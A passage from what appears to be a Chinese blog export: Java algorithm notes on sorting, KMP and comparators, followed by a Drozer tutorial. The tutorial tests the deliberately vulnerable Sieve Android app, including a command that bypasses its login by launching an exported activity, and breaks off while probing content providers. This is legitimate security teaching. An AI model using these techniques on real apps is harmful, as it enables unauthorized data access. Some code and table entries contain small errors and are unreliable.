时间复杂度：O(n^2)\n// 空间复杂度：O(n^2)\nclass Solution {\n\t\tpublic List<String> binaryTreePaths(TreeNode root) {\n        List<String> res = new ArrayList<>();\n        if (root == null)\n            return res;\n        //队列，节点和路径成对出现，路径就是从根节点到当前节点的路径\n        Queue<Object> queue = new LinkedList<>();\n        queue.offer(root);\n        queue.offer(root.val + \"\");\n        while (!queue.isEmpty()) {\n            TreeNode node = (TreeNode) queue.poll();\n            String path = (String) queue.poll();\n            //如果到叶子节点，说明找到了一条完整路径\n            if (node.left == null && node.right == null) {\n                res.add(path);\n            }\n\n            //右子节点不为空就把右子节点和路径存放到队列中\n            if (node.right != null) {\n                queue.offer(node.right);\n                queue.offer(path + \"->\" + node.right.val);\n            }\n\n            //左子节点不为空就把左子节点和路径存放到队列中\n            if (node.left != null) {\n                queue.offer(node.left);\n                queue.offer(path + \"->\" + node.left.val);\n            }\n        }\n        return res;\n    }\n}\n```\n\n\n\n# 二、算法\n\n## ①排序\n\n### ⓿ 复杂度\n\n| 排序算法 | 平均时间         | 最差时间                | 稳定性 | 空间    | 备注                     |\n| -------- | ---------------- | ----------------------- | ------ | ------- | ------------------------ |\n| 冒泡排序 | O(n<sup>2</sup>) | O(n<sup>2</sup>)        | 稳定   | O(1)    | n较小时好                |\n| 选择排序 | O(n<sup>2</sup>) | O(n<sup>2</sup>)        | 不稳定 | O(1)    | n较小时好                |\n| 插入排序 | O(n<sup>2</sup>) | O(n<sup>2</sup>)        | 稳定   | O(1)    | 大部分已有序时好         |\n| 希尔排序 | O(nlogn)         | O(n<sup>s</sup>)(1<s<2) | 不稳定 | O(1)    | s是所选分组              |\n| 快速排序 | O(nlogn)         | O(n<sup>2</sup>)        | 不稳定 | O(logn) | n较大时好                |\n| 归并排序 | O(nlogn)         | O(nlogn)                | 稳定   | O(1)    | n较大时好                |\n| 基数排序 | O(n*k)           | O(n*k)                  | 稳定   | O(n)    | n为数据个数，k为数据位数 |\n| 堆排序   | O(nlogn)         | O(nlogn)                | 不稳定 | O(1)    | n较大时好                |\n\n### ❶冒泡排序\n\n**算法步骤**\n\n- 比较相邻的元素。如果第一个比第二个大，就交换他们两个。\n- 对每一对相邻元素作同样的工作。这步做完后，**最后的元素会是最大的数**。\n- 针对所有的元素重复以上的步骤，**除了最后一个**。\n- 持续每次对越来越少的元素重复上面的步骤，直到没有任何一对数字需要比较。\n- 一共进行了 `数组元素个数-1` 次大循环，小循环要比较的元素越来越少。\n- 优化：如果在某次大循环，发现没有发生交换，则证明已经有序。\n\n```java\npublic class BubbleSort {\n    public static void main(String[] args) {\n        int[] arr = {4, 5, 1, 6, 2};\n        int[] res = bubbleSort(arr);\n        System.out.println(Arrays.toString(res));\n    }\n\n    public static int[] bubbleSort(int[] arr) {\n        for (int i = 1; i < arr.length; i++) {\n            boolean flag = true;  //定义一个标识，来记录这趟大循环是否发生了交换\n            for (int j = 0; j < arr.length - i; j++) {\n                if (arr[j] > arr[j + 1]) {\n                    int temp = arr[j];\n                    arr[j] = arr[j + 1];\n                    arr[j + 1] = temp;\n                    flag = false;\n                }\n            }\n            //如果这次循环没发生交换，直接停止循环\n            if (flag){\n                break;\n            }\n        }\n        return arr;\n    }\n}\n```\n\n### ❷选择排序\n\n**算法步骤**\n\n- 遍历整个数组，找到最小（大）的元素，放到数组的起始位置。\n- 再遍历剩下的数组，找到剩下元素中的最小（大）元素，放到数组的第二个位置。\n- 重复以上步骤，直到排序完成。\n- 一共需要遍历 `数组元素个数-1` 次，当找到第二大（小）的元素时，可以停止。这时最后一个元素必是最大（小）元素。\n\n```java\npublic class SelectSort {\n    public static void main(String[] args) {\n        int[] arr = {3, 1, 6, 10, 2};\n        int[] res = selectSort(arr);\n        System.out.println(Arrays.toString(res));\n    }\n\n    public static int[] selectSort(int[] arr) {\n        for (int i = 0; i < arr.length - 1; i++) {\n            int min = i;\n            for (int j = i + 1; j < arr.length; j++) {\n                if(arr[min] > arr[j]){\n                    min = j;\n                }\n            }\n            // 将找到的最小值和i位置所在的值进行交换\n            int temp = arr[i];\n            arr[i] = arr[min];\n            arr[min] = temp;\n        }\n        return arr;\n    }\n}\n```\n\n### ❸插入排序\n\n**算法步骤**\n\n- 将待排序序列第一个元素看做一个**有序序列**，把第二个元素到最后一个元素当成是**未排序序列**。\n- 从头到尾依次扫描未排序序列，将扫描到的每个元素插入有序序列的适当位置。（如果待插入的元素与有序序列中的某个元素相等，则将待插入元素插入到相等元素的后面。\n\n```java\npublic class InsertSort {\n    public static void main(String[] args) {\n        int[] arr = {3, 1, 6, 10, 2};\n        int[] res = insertSort(arr);\n        System.out.println(Arrays.toString(res));\n    }\n\n    public static int[] insertSort(int[] arr) {\n        //从数组的第二个元素开始选择合适的位置插入\n        for (int i = 1; i < arr.length; i++) {\n            //记录要插入的数据,后面移动元素可能会覆盖该位置上元素的值\n            int temp = arr[i];\n            //从已经排序的序列最右边开始比较，找到比其小的数\n            //变量j用于遍历前面的有序数组\n            int j = i;\n            while (j > 0 && temp < arr[j - 1]) {\n                //如果有序数组中的元素大于temp，则后移一个位置\n                arr[j] = arr[j - 1];\n                j--;\n            }\n            //j所指位置就是待插入的位置\n            if (j != i) {\n                arr[j] = temp;\n            }\n        }\n        return arr;\n    }\n}\n```\n\n### ❹希尔排序\n\n**插入排序存在的问题**\n\n当最后一个元素为整个数组的最小元素时，需要将前面的有序数组中的每个元素都向后移一位，这样是非常花时间的。所以有了希尔排序来帮我们将数组从无序变为整体有序再变为有序。\n\n**算法步骤**\n\n- 选择一个增量序列 t1（一般是数组长度/2），t2（一般是一个分组长度/2），……，tk，**其中 ti > tj**, tk = 1；\n- 按增量序列个数 k，对序列进行 k 趟排序；\n- 每趟排序，根据对应的增量 ti，将待排序列分割成若干长度为 m 的子序列，分别对各子表进行直接插入排序。当增量因子为 1 时，整个序列作为一个表来处理，表长度即为整个序列的长度。\n\n<img src=\"../images/数据结构与算法/20200621122846.png\" style=\"zoom:50%;\" />\n\n```java\npublic class ShellSort {\n    public static void main(String[] args) {\n        int[] arr = {3, 6, 1, 4, 5, 8, 2, 0};\n        int[] res = shellSort(arr);\n        System.out.println(Arrays.toString(res));\n    }\n\n    public static int[] shellSort(int[] arr) {\n        //将数组分为gap组,每个组内部进行插入排序\n        for (int gap = arr.length / 2; gap > 0; gap /= 2) {\n            //i用来指向未排序数组的首个元素\n            for (int i = gap; i < arr.length; i++) {\n                int temp = arr[i];\n                int j = i;\n                while (j - gap >= 0 && temp < arr[j - gap]) {\n                    arr[j] = arr[j - gap];\n                    j -= gap;\n                }\n                arr[j] = temp;\n            }\n        }\n        return arr;\n    }\n}\n```\n\n### ❺快速排序\n\n**算法步骤**\n\n- 从数组中挑出一个元素，称为 “基准”（pivot）;\n- 重新排序数组；\n  - 比基准值小的元素摆放在基准前面\n  - 比基准值大的摆在基准的后面\n  - 相同的数可以到任一边\n- 排序好后，该基准就处于数列的中间位置。这个称为分区（partition）操作；\n- 然后递归地（recursive）把小于基准值的子数组和大于基准值元素的子数组再排序。\n\n```java\npublic class QuickSort {\n    public static void main(String[] args) {\n        int[] arr = {8, 12, 19, -1, 45, 0, 14, 4, 11};\n        quickSort(arr, 0, arr.length - 1);\n        System.out.println(Arrays.toString(arr));\n    }\n\n    public static void quickSort(int[] arr, int left, int right) {\n        //递归终止条件\n        if (left > right) return;\n        //定义数组第一个数为基准值\n        int pivot = arr[left];\n        //定义两个哨兵\n        int i = left;\n        int j = right;\n\n        while (i != j) {\n            //从右往左找比基准值小的数\n            while (pivot <= arr[j] && i < j) j--;\n            //从左往右找比基准值大的数\n            while (pivot >= arr[i] && i < j) i++;\n            if (i < j) { //如果i<j，交换它们\n                int temp = arr[i];\n                arr[i] = arr[j];\n                arr[j] = temp;\n            }\n        }\n        //把基准值放到合适的位置\n        arr[left] = arr[i];\n        arr[i] = pivot;\n        quickSort(arr, left, i - 1);//对左边的子数组进行快速排序\n        quickSort(arr, i + 1, right);//对右边的子数组进行快速排序\n    }\n}\n```\n\n参考：[快速排序法（详解）](https://blog.csdn.net/qq_40941722/article/details/94396010)\n\n### ❻归并排序\n\n> 归并排序（Merge sort）是建立在归并操作上的一种有效的排序算法。该算法是采用**分治法**（Divide and Conquer）的一个非常典型的应用。\n\n算法步骤\n\n1. 申请空间，该空间用来存放合并后的序列；\n2. 设定两个指针，最初位置分别为两个已经排序序列的起始位置；\n3. 比较两个指针所指向的元素，选择相对小的元素放入到合并空间，并移动指针到下一位置；\n4. 重复步骤 3 直到某一指针达到序列尾；\n5. 将序列剩下的所有元素直接复制到合并序列尾。\n\n![分治法](https://img.jwt1399.top/img/202210101308107.png)\n\n治理阶段\n\n| ![](https://img.jwt1399.top/img/202210101307305.png) | ![](https://img.jwt1399.top/img/202210101307861.png) |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n\n```java\npublic class MergeSort {\n    public static void main(String[] args) {\n        int[] arr = {8, 4, 5, 7, 1, 3, 6, 2};\n        int[] tmp = new int[arr.length];\n        mergeSort(arr, 0, arr.length - 1, tmp);\n        System.out.println(Arrays.toString(arr));\n    }\n\n    //分+治\n    public static void mergeSort(int[] arr, int left, int right, int[] tmp) {\n\n        if (left < right) {\n            int mid = (left + right) / 2;//中间索引\n            //向左递归进行分解\n            mergeSort(arr, left, mid, tmp);\n            //向左递归进行分解\n            mergeSort(arr, mid + 1, right, tmp);\n            //合并（治理）\n            merge(arr, left, right, tmp);\n\n        }\n    }\n\n\n    //治理阶段（合并）\n    public static void merge(int[] arr, int left, int right, int[] tmp) {\n\n        int mid = (left + right) / 2;\n        int i = left; // 初始化i, 左边有序序列的初始索引\n        int j = mid + 1; //初始化j, 右边有序序列的初始索引\n        int t = 0; // 指向temp数组的当前索引\n\n        //(一)\n        //先把左右两边(有序)的数据按照规则填充到temp数组\n        //直到左右两边的有序序列，有一边处理完毕为止\n        while (i <= mid && j <= right) {\n            if (arr[i] <= arr[j]) {\n                tmp[t++] = arr[i++];\n            } else {\n                tmp[t++] = arr[j++];\n            }\n        }\n        //(二)\n        //把有剩余数据的一边的数据依次全部填充到temp\n        while (i <= mid) {//左边的有序序列还有剩余的元素，就全部填充到temp\n            tmp[t++] = arr[i++];\n        }\n        while (j <= right) {\n            tmp[t++] = arr[j++];\n        }\n        //(三)\n        //将temp数组的元素拷贝到arr\n        t = 0;\n        while (left <= right) {\n            arr[left++] = tmp[t++];\n        }\n    }\n}\n```\n\n### ❼基数排序\n\n> 基数排序是使用空间换时间的经典算法\n\n**算法步骤**\n\n- 将所有待比较数值（正整数）统一为同样的数位长度，**数位较短的数前面补零**\n- 事先准备10个数组(10个桶)，对应位数的 0-9\n- 根据每个数最低位值(个位)，将数放入到对应位置桶中，即进行一次排序\n-  然后从 0-9 个数组/桶，依次，按照加入元素的先后顺序取出 \n- 以此类推，从最低位排序一直到最高位（个位->十位->百位->…->最高位），循环轮数为最大数位长度\n- 排序完成以后, 数列就变成一个有序序列\n- 需要我们获得最大数的位数：可以通过将**最大数变为String类型**，再求得它的长度即可\n\n| 排序过程                                             | 排序后结果                     |\n| ---------------------------------------------------- | ------------------------------ |\n| ![](https://img.jwt1399.top/img/202210111549709.png) | {542，53 ，3 ，14 ，214 ，748} |\n| ![](https://img.jwt1399.top/img/202210111549451.png) | {3 ，14 ，214 ，542，748，53 } |\n| ![](https://img.jwt1399.top/img/202210111549884.png) | {3，14，53 ，214 ，542，748}   |\n\n```java\npublic class RadixSort {\n    public static void main(String[] args) {\n        int[] arr = {53, 3, 542, 748, 14, 214};\n        radixSort(arr);\n        System.out.println(Arrays.toString(arr));\n    }\n\n    public static void radixSort(int[] arr) {\n        //定义一个二维数组，表示10个桶, 每个桶就是一个一维数组\n        int[][] bucket = new int[10][arr.length];\n        //为了记录每个桶中存放了多少个数据,我们定义一个数组来记录各个桶的每次放入的数据个数\n        //比如：bucketElementCounts[0] , 记录的就是 bucket[0] 桶的放入数据个数\n        int[] bucketElementCounts = new int[10];\n        //最大位数\n        int maxLen = getMaxLen(arr);\n\n        for (int i = 0, n = 1; i < maxLen; i++, n *= 10) {\n            //maxLen轮排序\n            for (int j = 0; j < arr.length; j++) {\n                //取出每个元素的对应位的值\n                int digitOfElement = arr[j] / n % 10;\n                //放入到对应的桶中\n                bucket[digitOfElement][bucketElementCounts[digitOfElement]] = arr[j];\n                bucketElementCounts[digitOfElement]++;\n            }\n            //按照桶的顺序和加入元素的先后顺序取出，放入原来数组\n            int index = 0;\n            for (int k = 0; k < 10; k++) {\n                //如果桶中，有数据，我们才放入到原数组\n                int position = 0;\n                while (bucketElementCounts[k] > 0) {\n                    //取出元素放入到arr\n                    arr[index++] = bucket[k][position++];\n                    bucketElementCounts[k]--;\n                }\n            }\n        }\n\n    }\n\n    //得到该数组中最大元素的位数\n    public static int getMaxLen(int[] arr) {\n        int max = arr[0];\n        for (int i = 1; i < arr.length; i++) {\n            if (arr[i] > max) {\n                max = arr[i];\n            }\n        }\n        //将最大值转为字符串，它的长度就是它的位数\n        int maxLen = (max + \"\").length();\n        return maxLen;\n    }\n\n}\n```\n\n### ❽堆排序\n\n给定一个数组：String[] arr = {\"S\",\"O\",\"R\",\"T\",\"E\",\"X\",\"A\",\"M\",\"P\",\"L\",\"E\"}请对数组中的字符按从小到大排序。\n\n实现步骤：\n\n- 1.构造堆；\n- 2.得到堆顶元素，这个值就是最大值；\n- 3.交换堆顶元素和数组中的最后一个元素，此时所有元素中的最大元素已经放到合适的位置；\n- 4.对堆进行调整，重新让除了最后一个元素的剩余元素中的最大值放到堆顶；\n- 5.重复2~4这个步骤，直到堆中剩一个元素为止。\n\n![](../images/数据结构与算法/image-20221107171120761.png)\n\n```java\npublic class HeapSort {\n\n    public static void main(String[] args) throws Exception {\n        String[] arr = {\"S\", \"O\", \"R\", \"T\", \"E\", \"X\", \"A\", \"M\", \"P\", \"L\", \"E\"};\n        HeapSort.sort(arr);\n        System.out.println(Arrays.toString(arr));\n    }\n\n    //判断heap堆中索引i处的元素是否小于索引j处的元素\n    private static boolean less(Comparable[] heap, int i, int j) {\n        return heap[i].compareTo(heap[j]) < 0;\n    }\n\n    //交换heap堆中i索引和j索引处的值\n    private static void exch(Comparable[] heap, int i, int j) {\n        Comparable tmp = heap[i];\n        heap[i] = heap[j];\n        heap[j] = tmp;\n    }\n\n\n    //根据原数组source，构造出堆heap\n    private static void createHeap(Comparable[] source, Comparable[] heap) {\n        //把source中的元素拷贝到heap中，heap中的元素就形成一个无序的堆\n        System.arraycopy(source, 0, heap, 1, source.length);\n        //对堆中的元素做下沉调整(从长度的一半处开始，往索引1处扫描)\n        for (int i = (heap.length) / 2; i > 0; i--) {\n            sink(heap, i, heap.length - 1);\n        }\n\n    }\n\n    //对source数组中的数据从小到大排序\n    public static void sort(Comparable[] source) {\n        //构建堆\n        Comparable[] heap = new Comparable[source.length + 1];\n        createHeap(source, heap);\n        //定义一个变量，记录未排序的元素中最大的索引\n        int N = heap.length - 1;\n        //通过循环，交换1索引处的元素和排序的元素中最大的索引处的元素\n        while (N != 1) {\n            //交换元素\n            exch(heap, 1, N);\n            //排序交换后最大元素所在的索引，让它不要参与堆的下沉调整\n            N--;\n            //需要对索引1处的元素进行对的下沉调整\n            sink(heap, 1, N);\n        }\n        //把heap中的数据复制到原数组source中\n        System.arraycopy(heap, 1, source, 0, source.length);\n\n    }\n\n    //在heap堆中，对target处的元素做下沉，范围是0~range\n    private static void sink(Comparable[] heap, int target, int range) {\n\n        while (2 * target <= range) {\n            //1.找出当前结点的较大的子结点\n            int max;\n            if (2 * target + 1 <= range) {\n                if (less(heap, 2 * target, 2 * target + 1)) {\n                    max = 2 * target + 1;\n                } else {\n                    max = 2 * target;\n                }\n            } else {\n                max = 2 * target;\n            }\n\n            //2.比较当前结点的值和较大子结点的值\n            if (!less(heap, target, max)) {\n                break;\n            }\n            exch(heap, target, max);\n            target = max;\n        }\n    }\n}\n```\n\n\n\n## ②查找\n\n\n\n\n\n\n\n## ③比较\n\n### ❶Comparable\n\n> Comparable是排序接口。若一个类实现了Comparable接口，就意味着该类支持排序。实现了Comparable接口的类的对象的列表或数组可以通过`Collections.sort`或`Arrays.sort`进行自动排序。\n\n```java\n// 该接口定义如下：\npackage java.lang;\nimport java.util.*;\npublic interface Comparable<T> {\n    public int compareTo(T o);\n}\n```\n\n此接口只有一个方法`compareTo`，比较当前对象与指定对象的顺序，如果该对象小于、等于或大于指定对象，则分别返回负数、零或正数。\n\n现在我们假设一个Person类，代码如下：\n\n```java\npublic class Person{\n    String name;\n    int age;\n    public Person(String name, int age){\n        this.name = name;\n        this.age = age;\n    }\n    public String getName(){\n        return name;\n    }\n　　public int getAge(){\n        return age;\n    }\n}\n```\n\n现在有两个Person类的对象，我们如何来比较二者的大小呢？我们可以通过让Person实现Comparable接口：\n\n```java\npublic class Person implements Comparable<Person>{\n    String name;\n    int age;\n    public Person(String name, int age){\n        this.name = name;\n        this.age = age;\n    }\n    public String getName(){\n        return name;\n    }\n    public int getAge(){\n        return age;\n    }\n    @Override\n    public int compareTo(Person p){\n        return this.age - p.getAge();\n    }\n  \n    public static void main(String[] args){\n        Person[] people = new Person[]{new Person(\"小明\", 20),new Person(\"小红\", 10)};\n        Arrays.sort(people);\n    }\n}\n```\n\n### ❷Comparator\n\n> Comparator是比较接口，我们如果需要控制某个类的次序，而该类本身不支持排序(即没有实现Comparable接口)，那么我们就可以建立一个“该类的比较器”来进行排序，这个“比较器”只需要实现Comparator接口即可。\n\n```java\n// 该接口定义如下：\npackage java.util;\npublic interface Comparator<T>\n {\n    int compare(T o1, T o2);\n    boolean equals(Object obj);\n }\n```\n\n- 若一个类要实现Comparator接口：它一定要实现`compare()` 函数，但可不实现`equals()` 函数。\n\n- `compare(T o1, T o2)` 是“比较o1和o2的大小”。\n  - 返回“负数”，意味着“o1比o2小”\n  - 返回“零”，意味着“o1等于o2”\n  - 返回“正数”，意味着“o1大于o2”\n\n现在假如上面的Person类没有实现Comparable接口，该如何比较大小呢？我们可以新建一个类，让其实现Comparator接口，从而构造一个“比较器\"。\n\n```java\npublic class PersonCompartor implements Comparator<Person>{\n    @Override\n    public int compare(Person o1, Person o2){\n        return o1.getAge() - o2.getAge();\n    }\n}\n```\n\n现在我们就可以利用这个比较器来对其进行排序：\n\n```java\npublic class Test{\n    public static void main(String[] args){\n        Person[] people=new Person[]{new Person(\"小明\", 20),new Person(\"小红\", 10)};\n        Arrays.sort(people,new PersonCompartor());\n    }\n}\n\n//写法2\npublic class Test2{\n    public static void main(String[] args){\n        Person[] people=new Person[]{new Person(\"小明\", 20),new Person(\"小红\", 10)};\n        Arrays.sort(people,new Comparator<Person>(){\n        \t\tpublic int compare(Person o1, Person o2){\n        \t\t\t\treturn o1.getAge() - o2.getAge();\n    \t\t\t\t}\n        });\n    }\n}\n```\n\n### Comparable和Comparator区别\n\n> Comparable是排序接口，若一个类实现了Comparable接口，就意味着“该类支持排序”。\n>\n> Comparator是比较器，我们若需要控制某个类的次序，可以建立一个“该类的比较器”来进行排序。\n\nComparable相当于“内部比较器”，而Comparator相当于“外部比较器”。\n\n- java.lang.Comparable：在类定义的时候，可以实现的接口，里面有compareTo这个方法需要实现\n- java.util.Comparator：是挽救的比较接口，需要单独定义一个比较类，里面有compare比较方法。\n\n两种方法各有优劣， 用Comparable简单， 只要实现Comparable接口的对象直接就成为一个可以比较的对象，但是需要修改源代码。 用Comparator的好处是不需要修改源代码， 而是另外实现一个比较器， 当某个自定义的对象需要作比较的时候，把比较器和对象一起传递过去就可以比大小了， 并且在Comparator 里面用户可以自己实现复杂的可以通用的逻辑，使其可以匹配一些比较简单的对象，那样就可以节省很多重复劳动了。\n\n## KMP算法\n\n> KMP 算法是一个快速查找匹配串的算法，它的作用是：**如何快速在「原字符串」中找到「匹配字符串」。**\n>\n> 暴力查找复杂度是 O(m∗n)，KMP 算法的复杂度为 O(m+n)，其中m为原字符串长度，m为匹配字符串长度\n\n[【自用数据结构】王道4.2.4 串的模式匹配 KMP算法+求Next数组(手算)+求Nextval数组(手算)](https://www.bilibili.com/video/BV1AG4y1W7DV/?spm_id_from=333.999.0.0&vd_source=fa98a6d1417d05689c64bc1449966321)\n\n[【KMP】从原理上详解next数组和nextval数组](https://blog.csdn.net/coding_with_smile/article/details/125521122)\n\n\n\n[【天勤考研】KMP算法易懂版_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1jb411V78H/?spm_id_from=333.337.search-card.all.click)\n\n[KMP字符串匹配算法1_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1Px411z7Yo/?spm_id_from=333.337.search-card.all.click&vd_source=fa98a6d1417d05689c64bc1449966321)\n\n[28. 找出字符串中第一个匹配项的下标 - 力扣（Leetcode）](https://leetcode.cn/problems/find-the-index-of-the-first-occurrence-in-a-string/solutions/575568/shua-chuan-lc-shuang-bai-po-su-jie-fa-km-tb86/)\n\n[算法数据结构系列-理论篇-字符串匹配（一）](https://blog.csdn.net/honestjiang/article/details/108044250)\n\n```java\nclass Solution {\n    public static int strStr(String haystack, String needle) {\n        int n = haystack.length(), m = needle.length();\n        if (m == 0) return 0;\n\n        // 1.构建 next 数组\n        int[] next = new int[m]; //next[0]=0\n        for (int i = 1, j = 0; i < m; i++) {\n            // 匹配不成功的话，j = next(j-1)\n            while (j > 0 && needle.charAt(i) != needle.charAt(j)) {\n                j = next[j - 1];\n            }\n            // 匹配成功的话，j++\n            if (needle.charAt(i) == needle.charAt(j)) {\n                j++;\n            }\n            // 更新 next[i]\n            next[i] = j;\n        }\n\n        // 2.匹配过程\n        for (int i = 0, j = 0; i < n; i++) {\n            // 匹配不成功 j = next(j-1)\n            while (j > 0 && haystack.charAt(i) != needle.charAt(j)) {\n                j = next[j - 1];\n            }\n            // 匹配成功的话，j++\n            if (haystack.charAt(i) == needle.charAt(j)) {\n                j++;\n            }\n            if (j == m) {\n                return i - m + 1;\n            }\n        }\n        return -1;\n    }\n}\n```\n\n\n\n\n\n## DFS\n\n## BFS\n\n## 回溯\n\n关系：回溯 < DFS < 递归\n\n## 递归\n\n## 迭代\n\n## 动态规划\n\n\n\n## 交换元素\n\n### 普通方法\n\n```java\nprivate void swap(int[] a, int i, int j) {\n    int tmp = a[i]\n    a[i] = a[j]\n    a[j] = tmp\n    System.out.println(\"swap:\" + a[j] + \" <-> \" + a[i]);\n}\n```\n\n### 异或方法\n\n```java\nprivate void swap(int[] a, int i, int j) {\n    if (i == j){return;}//关键 两个一样的数异或结果为0\n    a[i] = a[i] ^ a[j];\n    a[j] = a[i] ^ a[j];\n    a[i] = a[i] ^ a[j];\n    System.out.println(\"swap:\" + a[j] + \" <-> \" + a[i]);\n}\n```\n\n\n\n\n\n# ❤️Sponsor\n\n您的支持是我不断前进的动力，如果您恰巧财力雄厚，又感觉本文对您有所帮助的话，可以考虑打赏一下本文，用以维持本博客的运营费用，拒绝白嫖，从你我做起！🥰🥰🥰\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["数据结构","算法"],"categories":["结构-算法"]},{"title":"Drozer-Android安全测试","url":"/posts/4946.html","content":"\n## 1.Drozer简介\n\n> drozer是一款针对Android系统的安全测试框架。drozer可以帮助App和设备变得更安全，其提供了很多Android平台下的渗透测试exploit供你使用和分享。对于远程的exploit，它可以生成shellcode帮助你进行远程设备管理。\n\n## 2.环境配置\n\n1.jdk1.6+\n2.python2.7\n3.android sdk\n4.安装adb\n5.模拟器也要安装drozer  agent\n6.确保配置了adb、java环境变量\n\n### 安装drozer\n\n方法一：直接下载drozer\n\n下载地址：https://labs.mwrinfosecurity.com/tools/drozer/ (下载drozer (RPM))，解压后drozer在`drozer\\usr\\bin`路径下\n\n方法二：利用Appie里面带有的drozer\n\n下载在appie解压后drozer在`Appie\\base\\`路径下\n\n![](https://i.loli.net/2020/03/23/H1ubzFpkPylJ4OC.png)\n\n### 模拟器安装agent.apk\n\n将agent.apk下载后，通过cmd安装或者直接拖进模拟器进行安装\n\n```bash\nadb install 安装路径/agent.apk\n```\n\n### 模拟器安装sieve.apk\n> sieve.apk为官网给的测试apk，上面自带各种漏洞，后面的案例以sieve.apk为例演示\n\n将sieve.apk下载后，通过cmd安装或者直接拖进模拟器进行安装\n\n```bash\nadb install 安装路径/sieve.apk\n```\n\n## 3.连接mumu模拟器\n\n打开cmd运行\n\n```bash\nadb connect 127.0.0.1:7555\n```\n\n![](https://i.loli.net/2020/03/23/rnxMjLdhG7XvFIQ.png)\n\n\n\n## 4.进入Drozer控制台\n\n首先要在mumu模拟器中打开drozer-agent\n\n![](https://i.loli.net/2020/03/25/7rinHakSmXOCy1R.png)\n\n然后使用 adb 进行端口转发，转发到上边Drozer使用的默认端口` 31415`，并进入Drozer 控制台\n\n```bash\nadb forward tcp:31415 tcp:31415\n\ne:\ncd Appie/base  //进入drozer的安装路径下\ndrozer console connect\n```\n\n<img src=\"https://i.loli.net/2020/03/23/esFra6tB3mGWNxw.png\"  style=\"zoom: 50%;\" />\n\n看到如上显示，说明启动成功，下一步则可以进行测试\n\n## 5.配置Siveve\n\n> Sieve：一款Android安全测试APP\n\n为了我们后面的安全案例讲解，我们需要先配置Sieve。\n打开sieve，第一次进入需要输入16位的密码，提交后需要创建4位数的PIN\n设置密码：1234567890123456\nPIN：1399\n\n进去功能界面，添加新的密码，邮箱；主要是为了往数据库添加数据，方便之后的攻击显示结果,，随便乱填就可以了。我添加了一个名为`jwt`的信息\n\n![](https://i.loli.net/2020/03/25/mQ9vNdS4zGu5AhJ.png)\n\n配置好就可以开始安全测试了\n\n## 6.Drozer之sieve安全测试\n\n### 6.1列出安装的所有应用包名\n\n```bash\ndz> run app.package.list\n```\n\n![](https://i.loli.net/2020/03/25/rgYaRcxUhIMVQp9.png)\n\n**中文乱码解决方法：**\n\n使用`run app.package.list`命令可能会出现中文乱码，下面是我在网上找的解决办法，找到下图路径下文件进行对应修改，就可以了。亲测有效！\n\n![](https://i.loli.net/2020/03/25/WJugIejU8d79pyY.png)\n\n![](https://i.loli.net/2020/03/25/PiK4G1xgjIaeZlC.png)\n\n### 6.2利用关键词搜索得出包名\n\n> run app.package.list -f  关键字\n\n```bash\ndz> run app.package.list -f sieve\ncom.mwr.example.sieve\n```\n\n### 6.3查看包的详细信息\n\n```bash\ndz> run app.package.info -a  com.mwr.example.sieve\n```\n\n![](https://i.loli.net/2020/03/23/1LSyKnO64iDM5pt.png)\n\n通过上述方式，我们可以获得应用数据目录、apk的路径、UID、GID等信息。\n\n### 6.4识别攻击面\n\n```\ndz> run app.package.attacksurface com.mwr.example.sieve \n```\n\n![](https://i.loli.net/2020/03/25/tEFABOVJl52P6va.png)\n\n这里我们发现有`3个activities，0个broadcast receivers,2个content providers，2个services exported`是导出的，这些都是潜在风险入口。\n\n#### activities组件\n\n应用程序中，一个Activity通常就是一个单独的界面，它上面可以显示一些控件也可以监听并处理用户的事件做出响应。 Activity之间通过Intent进行通信。在Intent的描述结构中，有两个最重要的部分：动作和动作对应的数据。\n\n#### broadcast组件\n\nBroadcastReceive广播接收器应用可以使用它对外部事件进行过滤只对感兴趣的外部事件(如当电话呼入时，或者数据网络可用时)进行接收并做出响应。广播接收器没有用户界面。然而，它们可以启动一个activity或serice 来响应它们收到的信息，或者用NotificationManager来通知用户。通知可以用很多种方式来吸引用户的注意力──闪动背灯、震动、播放声音等。一般来说是在状态栏上放一个持久的图标，用户可以打开它并获取消息。\n\n#### content 组件\n\nandroid平台提供了Content Provider使一个应用程序的指定数据集提供给其他应用程序。这些数据可以存储在文件系统中、在一个SQLite数据库、或以任何其他合理的方式。其他应用可以通过ContentResolver类从该内容提供者中获取或存入数据。只有需要在多个应用程序间共享数据是才需要内容提供者。\n\n#### services组件\n\n一个Service 是一段长生命周期的，没有用户界面的程序，可以用来开发如监控类程序。较好的一个例子就是一个正在从播放列表中播放歌曲的媒体播放器。在一个媒体播放器的应用中，应该会有多个activity，让使用者可以选择歌曲并播放歌曲。\n\n### 6.5测试activities exported (绕过登陆验证)\n\n```bash\ndz> run app.activity.info -a com.mwr.example.sieve \n//显示暴露的Activity信息\n```\n![](https://i.loli.net/2020/03/25/VIjZwCiOTB6Qchp.png)\n\n根据名称可以猜测出`.FileSelectActivity`可能是和文件有关，`.MainLoginActivity`就是主界面，`.PWList`可能和密码有关。\n\n正常使用app需要输入PIN或者密码才能进去主界面，\n\n![](https://i.loli.net/2020/03/25/UiW2CqJYlc3E4mG.png)\n\n但是看到`FileSelectActivity`和`PWList`明显是登陆进去后的界面，这里我们可以直接调用此两个activity，从而绕过登陆验证。\n\n```bash\ndz> run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList     //该命令会生成一个合适的intent来启动activity\n```\n\n运行之后可以直接进入到我们一开始配置的测试信息界面，绕过了登录验证\n\n![](https://i.loli.net/2020/03/25/4Yc1fHxKX5NZsSr.png)\n\n> 越权漏洞--绕过登录界面导致可直接访问Your Passwords界面，说明存在越权漏洞。\n\n### 6.6测试 content provider(数据库泄露，sql注入等问题)\n\n```bash\ndz> run app.provider.info -a com.mwr.example.sieve     //列举Content Provider的信息\n```\n\n![](https://i.loli.net/2020/04/01/DhrXCIodKA6U3uZ.png)\n\n```bash\ndz> run app.provider.finduri com.mwr.example.sieve     